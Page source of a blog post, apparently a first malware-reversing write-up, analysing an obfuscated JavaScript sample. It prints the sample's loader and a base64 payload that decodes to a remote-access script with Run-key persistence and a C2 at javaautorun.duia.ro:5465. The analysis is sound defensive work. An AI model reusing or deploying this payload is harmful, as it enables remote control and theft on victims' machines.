+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+    
+
+    
+
+    
+
+    
+    <div class="mb-5"></div>
+    
+  
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open class="toc-right mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#hash-values">Hash Values</a></li>
+    <li><a href="#approach">Approach</a>
+      <ul>
+        <li><a href="#analysis-take-two">Analysis Take Two</a></li>
+        <li><a href="#interjection-the-folly-of-an-analyst">Interjection: The folly of an analyst</a></li>
+        <li><a href="#the-analysis-deepens">The Analysis&hellip; deepens?</a></li>
+        <li><a href="#host-indicators">Host Indicators</a></li>
+        <li><a href="#network-indicators">Network Indicators</a></li>
+      </ul>
+    </li>
+    <li><a href="#mitre-attck">MITRE ATT&amp;CK</a></li>
+    <li><a href="#signatures">Signatures</a>
+      <ul>
+        <li><a href="#sigma">SIGMA</a></li>
+        <li><a href="#snort-and-suricata">Snort and Suricata</a></li>
+        <li><a href="#yara-signature">YARA Signature</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned-in-analysis">Lessons Learned in Analysis</a></li>
+    <li><a href="#resources">Resources</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#hash-values">Hash Values</a></li>
+    <li><a href="#approach">Approach</a>
+      <ul>
+        <li><a href="#analysis-take-two">Analysis Take Two</a></li>
+        <li><a href="#interjection-the-folly-of-an-analyst">Interjection: The folly of an analyst</a></li>
+        <li><a href="#the-analysis-deepens">The Analysis&hellip; deepens?</a></li>
+        <li><a href="#host-indicators">Host Indicators</a></li>
+        <li><a href="#network-indicators">Network Indicators</a></li>
+      </ul>
+    </li>
+    <li><a href="#mitre-attck">MITRE ATT&amp;CK</a></li>
+    <li><a href="#signatures">Signatures</a>
+      <ul>
+        <li><a href="#sigma">SIGMA</a></li>
+        <li><a href="#snort-and-suricata">Snort and Suricata</a></li>
+        <li><a href="#yara-signature">YARA Signature</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned-in-analysis">Lessons Learned in Analysis</a></li>
+    <li><a href="#resources">Resources</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <h2 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>I want to caveat your reading of this post with this; this is all about dipping the old cyber toe into reversing. I will make mistakes, I will document said mistakes throughout and even when I have published this blog, there will undoubtedly be things that more experienced folk will pick up that I might have misinterpreted or plainly gotten wrong. Regardless, I hope this serves as a nice write up for other folks that are interested in the field as well as giving a bit back to the community.</p>
+<p>This sample was collected from ANY.RUN. It contains commonly used obfuscation techniques to hide/obscure the contents of the script. Noting this, I thought it served as a good starting point for analysis. So without further ado, lettuce commence.</p>
+<h2 class="relative group">Hash Values 
+    <div id="hash-values" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#hash-values" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Hash</strong></th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>MD5</strong>:</td>
+<td>ee3851d1ae3dca617ea7ca4331e2bc8f</td>
+</tr>
+<tr>
+<td><strong>SHA1</strong>:</td>
+<td>8759637e8acb0406d0a485ae784f28205cc4dccf</td>
+</tr>
+<tr>
+<td><strong>SHA256</strong>:</td>
+<td>f0aa755fc9a44a0406ee649d6ae6f05b18bbe0b3be072c96e9ecb6269ab25636</td>
+</tr>
+</tbody>
+</table>
+<h2 class="relative group">Approach 
+    <div id="approach" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#approach" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>I started this task with your basic static protocols. I had a bit of a squiz at the thing in Notepad++. Initially it was a visual nightmare, a bunch of randomly named functions, with some wild, random blobs of data.  I ended up installing a nice JS plugin called &ldquo;JSTool&rdquo; to help visualise and format this code so that my eyeballs didn&rsquo;t bleed from the chonk of the thing.</p>
+<p><em>Although I later learned that Cyberchef has the same function, if not actually better than this plugin, so I actually completed this step again using the output from that tool.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_8</span>, <span style="color:#a6e22e">_1</span>, <span style="color:#a6e22e">_0x2162</span>, <span style="color:#a6e22e">_2</span>, <span style="color:#a6e22e">_7</span>, <span style="color:#a6e22e">_6</span>, <span style="color:#a6e22e">_5</span>, <span style="color:#a6e22e">_9</span>, <span style="color:#a6e22e">superString</span>, <span style="color:#a6e22e">xmlDOM</span>, <span style="color:#a6e22e">_0x2ebc</span>, <span style="color:#a6e22e">_4</span>, <span style="color:#a6e22e">comObject</span>, <span style="color:#a6e22e">_3</span>;
+</span></span><span style="display:flex;"><span>(<span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_$af1389795</span>() {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">V</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x2162</span>, <span style="color:#a6e22e">R</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x2ebc</span>();;) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_$af1389802</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">_$af1389797</span>(<span style="color:#66d9ef">true</span>, <span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">_$af1389808</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>			} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">_$af1389806</span>) {
+</span></span><span style="display:flex;"><span>						<span style="color:#a6e22e">_$af1389813</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>					;
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">603220</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">136</span>)) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">150</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> (parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">131</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">148</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">130</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">*</span> (parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">171</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">159</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">133</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> (parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">128</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">9</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">V</span>(<span style="color:#ae81ff">157</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>) {
+</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>					;
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">shift</span>());
+</span></span><span style="display:flex;"><span>				} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">V</span>) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">R</span>.<span style="color:#a6e22e">shift</span>());
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p><em>Figure 1: Look at that delightful formatting from Cyberchef.io</em></p>
+<p>In my initial scan, I looked for key identifiers that could help me understand <em>what exactly</em> this script was doing. Immediately, nothing really makes sense, so it is easy to say that this is obfuscated.</p>
+<p>The function that immediately warranted further investigation was <code>_$af13899809</code> with a variable that contained a chunk of intriguing code.</p>
+<pre tabindex="0"><code>Ly8gQ29kZWQgYnkgdl9CMDEgfCBTbGllbWVyZXogLT4gVHdpdHRlci&lt;_6IFNsaWVtZXJleg0KDQp2YXIgai&lt;_9IFsiV1NjcmlwdC5TaGVsbCIsIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IiwiU2hlbGwuQXBwbGljYXRpb24iLCJNaWNyb3NvZnQuWE1MSFRUUCJdOw0KdmFyIGcgPSBbIkhLQ1UiLCJIS0xNIiwiSEtDVVxcdmp3MHJtIiwiXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFwiLCJIS0xNXFxTT0ZUV0FSRVxcQ2xhc3Nlc1xcIiwiUkVHX1NaIiwiXFxkZWZhdWx0aWNvblxcIl07DQp2YXIgeS&lt;_9IFsid2lubWdtdHM6Iiwid2luMzJfbG9naWNhbGRpc2siLCJXaW4zMl9PcGVyYXRpbmdTeXN0ZW0iLCdBbnRpVmlydXNQcm9kdWN0J107DQoNCnZhciBzaC&lt;_9IENyKD&lt;_pOw0KdmFyIGZzID0gQ3IoMSk7DQp2YXIgc3BsID0gInxWfCI7DQp2YXIgQ2ggPS&lt;_iXFwiOw0KdmFyIFZOID0gIjkvMjEiICsgIl8iICsgT2IoNik7DQp2YXIgZnUgPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lOw0KdmFyIHduID0gV1NjcmlwdC5TY3JpcHROYW1lOw0KdmFyIFU7DQp0cnkgew0KVS&lt;_9IHNoLlJlZ1JlYWQoZ1syXSk7DQp9IGNhdGNoKGVycikgew0KdmFyIHN2ID0gZnUuc3BsaXQoIlxcIik7DQppZi&lt;_oIjpcXCIgKyBzdlsxXS&lt;_9PS&lt;_iOlxcIi&lt;_rIHduKSB7DQpVID0gIlRSVUUiOw0Kc2guUmVnV3JpdGUoZ1syXSxVLGdbNV0pOw0KfSBlbHNlIHsNClUgPS&lt;_iRkFMU0UiOw0Kc2guUmVnV3JpdGUoZ1syXSxVLGdbNV0pOw0KfQ0KfQ0KTnMoKTsNCmRvIHsNCnRyeSB7DQp2YXIgUC&lt;_9IFB0KCdWcmUnLCcnKTsNCl&lt;_gPSBQLnNwbGl0KHNwbCk7DQoNCmlmIChQWzBdID09PS&lt;_iQ2wiKSB7DQpXU2NyaXB0LlF1aXQoMSk7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iU2MiKSB7DQp2YXIgczIgPSBFeCgidGVtcCIpICsgIlxcIi&lt;_rIFBbMl07DQp2YXIgZmkgPSBmcy5DcmVhdGVUZXh0RmlsZShzMix0cnVlKTsNCmZpLldyaXRlKFBbMV0pOw0KZmkuQ2xvc2UoKTsNCnNoLnJ1bihzMik7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iRXgiKSB7DQpldmFsKFBbMV0pOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlJuIikgew0KdmFyIHJpID0gZnMuT3BlblRleHRGaWxlKGZ1LDEpOw0KdmFyIGZyID0gcmkuUmVhZEFsbCgpOw0KcmkuQ2xvc2UoKTsNClZOID0gVk4uc3BsaXQoIl8iKTsNCmZyID0gZnIucmVwbGFjZShWTlswXSxQWzFdKTsNCnZhciB3aS&lt;_9IGZzLk9wZW5UZXh0RmlsZShmdSwyLGZhbHNlKTsNCndpLldyaXRlKGZyKTsNCndpLkNsb3NlKCk7DQpzaC5ydW4oIndzY3JpcHQuZXhlIC8vQiBcIiIgKyBmdS&lt;_rICJcIiIpOw0KV1NjcmlwdC5RdWl0KDEpOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlVwIikgew0KdmFyIHMyID0gRXgoInRlbX&lt;_iKS&lt;_rICJcXCIgKyBQWzJdOw0KdmFyIGN0Zi&lt;_9IGZzLkNyZWF0ZVRleHRGaWxlKHMyLHRydWUpOw0KdmFyIGd1ID0gUFsxXTsNCmd1ID0gZ3UucmVwbGFjZSgifFV8IiwifFZ8Iik7DQpjdGYuV3JpdGUoZ3UpOw0KY3RmLkNsb3NlKCk7DQpzaC5ydW4oIndzY3JpcHQuZXhlIC8vQiBcIiIgKyBzMi&lt;_rICJcIiIsNik7DQpXU2NyaXB0LlF1aXQoMSk7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iVW4iKSB7DQp2YXIgczIgPSBQWzFdOw0KdmFyIHZkci&lt;_9IGZ1Ow0KdmFyIHJlZ2kgPS&lt;_iTm90aGluZyEiOw0KczIgPSBzMi5yZXBsYWNlKCIlZiIsZnUpLnJlcGxhY2UoIiVuIix3bikucmVwbGFjZSgiJXNmZHIiLHZkcikucmVwbGFjZSgiJVJnTmUlIixyZWdpKTsNCmV2YWwoczIpOw0KV1NjcmlwdC5RdWl0KDEpOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlJGIikgew0KdmFyIHMyID0gRXgoInRlbX&lt;_iKS&lt;_rICJcXCIgKyBQWzJdOw0KdmFyIGZpID0gZnMuQ3JlYXRlVGV4dEZpbGUoczIsdHJ1ZSk7DQpmaS5Xcml0ZShQWzFdKTsNCmZpLkNsb3NlKCk7DQpzaC5ydW4oczIpOw0KfQ0KfSBjYXRjaChlcnIpIHsNCn0NCldTY3JpcHQuU2xlZX&lt;_oNz&lt;_wMCk7DQoNCn0gd2hpbGUgKHRydWUpIDsNCg0KDQpmdW5jdGlvbiBFeChTKSB7DQpyZXR1cm4gc2guRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlIi&lt;_rIFMgKy&lt;_iJSIpOw0KfQ0KZnVuY3Rpb24gUHQoQyxBKSB7DQp2YXIgWC&lt;_9IENyKDMpOw0KWC5vcGVuKCdQT1NUJywnaHR0cDovL2phdmFhdXRvcnVuLmR1aWEucm86NTQ2NS8nICsgQywgZmFsc2UpOw0KWC5TZXRSZXF1ZXN0SGVhZGVyKCJVc2VyLUFnZW50OiIsbmYoKSk7DQpYLnNlbmQoQSk7DQpyZXR1cm4gWC5yZXNwb25zZXRleHQ7DQp9DQoNCg0KZnVuY3Rpb24gbmYoKSB7DQp2YXIgcyxOVCxpOw0KaWYgKGZzLmZpbGVleGlzdHMoRXgoIldpbmRpciIpICsgIlxcTWljcm9zb2Z0Lk5FVFxcRnJhbWV3b3JrXFx2Mi4wLjUwNzI3XFx2YmMuZXhlIikpIHsNCk5UID0iWUVTIjsNCn0gZWxzZSB7DQpOVC&lt;_9ICJOTyI7DQp9DQpzID0gVk4gKyBDaC&lt;_rIEV4KCJDT01QVVRFUk5BTUUiKS&lt;_rIENoICsgRXgoIlVTRVJOQU1FIikgKyBDaC&lt;_rIE9iKDIpICsgQ2ggKyBPYig0KS&lt;_rIENoICsgQ2ggKyBOVC&lt;_rIENoICsgVS&lt;_rIENoOw0KcmV0dXJuIHM7DQp9DQoNCmZ1bmN0aW9uIENyKE4pIHsNCglyZXR1cm4gbmV3IEFjdGl2ZVhPYmplY3QoaltOXSk7DQp9DQoNCmZ1bmN0aW9uIE9iKE4pIHsNCnZhciBzOw0KaWYgKE4gPT0gMikgew0Kcy&lt;_9IEdldE9iamVjdCh5WzBdKS5JbnN0YW5jZXNPZih5WzJdKTsNCnZhciBlbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCnZhciBpdC&lt;_9IGVuLml0ZW0oKTsNCnJldHVybiBpdC5DYXB0aW9uOw0KYnJlYWs7DQp9DQp9DQppZi&lt;_oTi&lt;_9PS&lt;_0KSB7DQp2YXIgd21nID0gIndpbm1nbXRzOlxcXFxsb2NhbGhvc3RcXHJvb3RcXHNlY3VyaXR5Y2VudGVyIjsNCnMgPSBHZXRPYmplY3Qod21nKS5JbnN0YW5jZXNPZih5WzNdKTsNCnZhciBlbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCnZhciBpdC&lt;_9IGVuLml0ZW0oKTsNCnZhciBzdHIgPSBpdC5EaXNwbGF5TmFtZTsNCn0NCmlmIChzdHIgIT09ICcnKSB7DQp3bWcgPSB3bWcgKy&lt;_iMiI7DQpzID0gR2V0T2JqZWN0KHdtZykuSW5zdGFuY2VzT2YoeVszXSk7DQplbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCml0ID0gZW4uaXRlbSgpOw0KcmV0dXJuIGl0LkRpc3BsYXlOYW1lOw0KfQ0KfSBlbHNlIHsNCnJldHVybiBpdC5EaXNwbGF5TmFtZTsNCn0NCn0NCmlmIChOPT02KSB7DQpzID0gR2V0T2JqZWN0KHlbMF0pLkluc3RhbmNlc09mKHlbMV0pOw0KdmFyIGVuID0gbmV3IEVudW1lcmF0b3Iocyk7DQpmb3IgKDsgIWVuLmF0RW5kKCk7ZW4ubW92ZU5leHQoKSkgew0KdmFyIGl0ID0gZW4uaXRlbSgpOw0KcmV0dXJuIGl0LnZvbHVtZXNlcmlhbG51bWJlcjsNCmJyZWFrOw0KfQ0KfQ0KfQ0KDQpmdW5jdGlvbiBOcygpIHsNCgkNCgkNCgkNCgl0cnkgew0KCQl2YXIgYX&lt;_gPSBDcigyKTsNCgkJZnMuQ29weUZpbGUoZnUsIGFwLk5hbWVTcGFjZSg3KS5TZWxmLlBhdGggKy&lt;_iXFwiICsgd24sdHJ1ZSk7DQoJfSBjYXRjaChlcnIpIHsNCgl9DQp9DQoNCg0K
+</code></pre><p><em>Figure 2: Encoded chunk of text</em></p>
+<p>I do believe you just might be base64 encoded fren.</p>
+<p>Lets test that theory.</p>
+<p>I threw the blob into Cyberchef.io to hopefully reveal the sage wisdom of the malware. Alas, it still looked incredibly borked in the output. Some components of the code were readable, but there were distinct blobs that again, simply didnt look right.</p>
+<pre tabindex="0"><code>// Coded by v_B01 | Sliemerez -&gt; Twitter...Û.Y[Y\.^.B.B..\...Ò.²%u67&amp;..Bå6.VÆÂ&#34;Â%67&amp;..F.æräf.ÆU7.7FVÔö&amp;¦V7B&#34;Â%6.VÆÂä...Æ.6.F.öâ&#34;Â$Ö.7&amp;÷6ögBå.ÔÄ.EE.%Ó°Ð§f.&#34;.r.Ò.²$.´5R&#34;Â$.´ÄÒ&#34;Â$.´5UÅÇf§s.&amp;Ò&#34;Â%ÅÅ6ögGv.&amp;UÅÄÖ.7&amp;÷6ögEÅÅv.æF÷w5ÅÄ7W&#39;&amp;VçEfW&#39;6.öåÅÅ&#39;VåÅÂ&#34;Â$.´ÄÕÅÅ4ôeEt.$UÅÄ6Æ.76W5ÅÂ&#34;Â%$Tuõ5¢&#34;Â%ÅÆFVf.VÇF.6öåÅÂ%Ó°Ð§f.&#34;..ô.l.Ý¥¹µ.µÑÌè.°.Ý¥¸ÌÉ}±½.¥..±.¥Í¬.°.]¥¸ÌÉ}=Á.É.Ñ¥¹.MåÍÑ.´.°..¹Ñ¥Y¥ÉÕÍAÉ½.Õ.Ð.tì4(4)Ù.È.Í ½ Cr(:NÃB..\...È.H.Ü..JNÃB..\..Ü...H......ÃB..\..Ú..J%ÅÂ#°Ð§f.&#34;.dâ.Ò.#.ó#.&#34;.².%ò&#34;.².ö&#34;.b.°Ð§f.&#34;.gR.Ò.u67&amp;..Bå67&amp;..DgVÆÄæ.ÖS°Ð§f.&#34;.vâ.Ò.u67&amp;..Bå67&amp;..Dæ.ÖS°Ð§f.&#34;.S°Ð§G&#39;..°Ð¥Rô.Í ¹I..I...¡.lÉt¤ì4)ô...Ñ. ¡.ÉÈ¤.ì4)Ù.È.ÍØ.ô..Ô¹ÍÁ±¥Ð .qp.¤ì4)¥.¨&#34;:\\&#34; + sv[1]/OJ#¥ÅÂ&#34;¬.Ý¸¤.ì4)T.ô..QIU..ì4)Í ¹I..]É¥Ñ.¡.lÉt±T±.lÕt¤ì4)ô..±Í..ì4)T.ô¢FALSE&#34;;
+sh.RegWrite(g[2],U,g[5]);
+}
+}
+Ns();
+do {
+try {
+var P/H..
+	Õ..IË	ÉÊNÃB..Ò..ç7.Æ.B.7.Â.°Ð Ð¦.b...³.Ò.ÓÓÒ.
+°.¤.ì4)]M.É¥ÁÐ¹EÕ¥Ð Ä¤ì4)ô4(4)¥..¡AlÁt.ôôô¢Sc&#34;) {
+var s2 = Ex(&#34;temp&#34;) + &#34;\\&#34;*È..Ì.NÃB..\...H.H..Ë.Ü.X].U.^...[.J.Ì....YJNÃB..K.Ü.].J..ÌWJNÃB..K.Û.ÜÙJ
+NÃB.Ú...[..Ì.NÃB.CB.B.Y.
+..Ì.H.OOJ$W.&#34;..°Ð¦Wf.Â..³.Ò.°Ð§ÐÐ Ð¦.b¡AlÁt½== &#34;Rn&#34;) {
+var ri = fs.OpenTextFile(fu,1);
+var fr = ri.ReadAll();
+ri.Close();
+VN = VN.split(&#34;_&#34;);
+fr = fr.replace(VN[0],P[1]);
+var wi/H..Ë.Ü.[..^...[.J..K....[.ÙJNÃB.ÚK.Ü.].J...NÃB.ÚK.Û.ÜÙJ
+NÃB.Ú...[...ÜØÜ.\...^.H.ËÐ.....
+È..J².%Â&#34;&#34;.°Ð¥u67&amp;..Bå.V.B...°Ð§ÐÐ Ð¦.b¡AlÁt½== &#34;Up&#34;) {
+var s2 = Ex(&#34;temx.J².%ÅÂ&#34;.²..³%Ó°Ð§f.&#34;.7Fbô..Ì¹
+É..Ñ.Q.áÑ.¥±.¡ÌÈ±ÑÉÕ.¤ì4)Ù.È..Ô.ô.AlÅtì4).Ô.ô..Ô¹É.Á±... .ñUð.°.ñYð.¤ì4).Ñ.¹]É¥Ñ.¡.Ô¤ì4).Ñ.¹
+±½Í. ¤ì4)Í ¹ÉÕ¸ .ÝÍ.É¥ÁÐ¹.á..¼½..p...¬.ÌÈ« &#34;\&#34;&#34;,6);
+WScript.Quit(1);
+}
+</code></pre><p><em>Figure 3: Partially decoded chunk of the script</em></p>
+<p>Initial screening of the readable information and we have gleaned some facts at least:</p>
+<ul>
+<li>The code has an author</li>
+<li>Reference to a domain name, potential C2 <code>http://javaautorun.duia.ro:5465</code> with a specific port for comms via POST request</li>
+<li>There is reference to a file on the operating system. <code>\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe</code></li>
+</ul>
+<p>At this point we have some interesting pieces of information and additionally, some solid evidence that points to our script being very naughty indeed.</p>
+<p>The next step was to figure out how to actually decode this information, so that everything is actually readable &ndash; as it should be. There <em>had</em> to be a key here.</p>
+<p><code>// Coded by v_B01 | Sliemerez -&gt; Twitter</code></p>
+<p>What is v_B01? and what is a Sliemerez?  how to we get it to tell us its secrets? It&rsquo;s time for some research.</p>
+<p>After a few hours of looking into samples that also included similar statements, I was at a bit of a loss. The frustration levels grew higher and I decided to walk away. On return, I took a different approach to the problem and focused instead on methodologies used by other malware analysts to look at similar malware written in JavaScript.</p>
+<h3 class="relative group">Analysis Take Two 
+    <div id="analysis-take-two" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
